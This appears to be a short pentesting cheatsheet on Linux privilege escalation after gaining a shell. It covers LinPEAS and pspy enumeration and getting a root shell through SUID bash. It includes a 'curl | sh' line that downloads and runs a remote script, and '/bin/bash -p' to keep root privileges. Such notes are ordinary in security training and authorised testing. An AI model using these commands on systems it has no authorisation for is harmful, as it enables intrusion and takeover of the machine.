---
title: "Linux Privilege Escalation"
tags: [ops, security, pentesting, linux]
---
Once you have a shell on a target, enumerate the system for misconfigurations before trying anything manual. [LinPEAS](https://github.com/carlospolop/PEASS-ng) and [pspy64](https://github.com/DominicBreuker/pspy) cover most of the ground automatically.

## Enumeration tools

**LinPEAS** scans the filesystem for SUID/SGID binaries, writable cron jobs, weak permissions, capabilities, and known kernel exploits, then color-codes findings by likely exploitability.

**pspy** watches running processes without root, which is how you catch cron jobs or scheduled tasks executing as another user in real time — something a one-shot enumeration script can't see.

## SUID bash

If `bash` itself has the SUID bit set (owned by root), running it with `-p` preserves the effective UID instead of dropping privileges, giving you a root shell.

```bash
find / -perm -4000 -type f 2>/dev/null # look for SUID binaries, check for bash
```

## Cheatsheet

### Enumeration
```bash
curl -sL <linpeas-url> | sh # download and run linpeas directly
./pspy64 # monitor processes for privileged cron/scheduled jobs
```

### SUID bash
```bash
find / -perm -4000 -type f 2>/dev/null # find SUID binaries
/bin/bash -p # spawn shell preserving privileges if bash has SUID bit
```
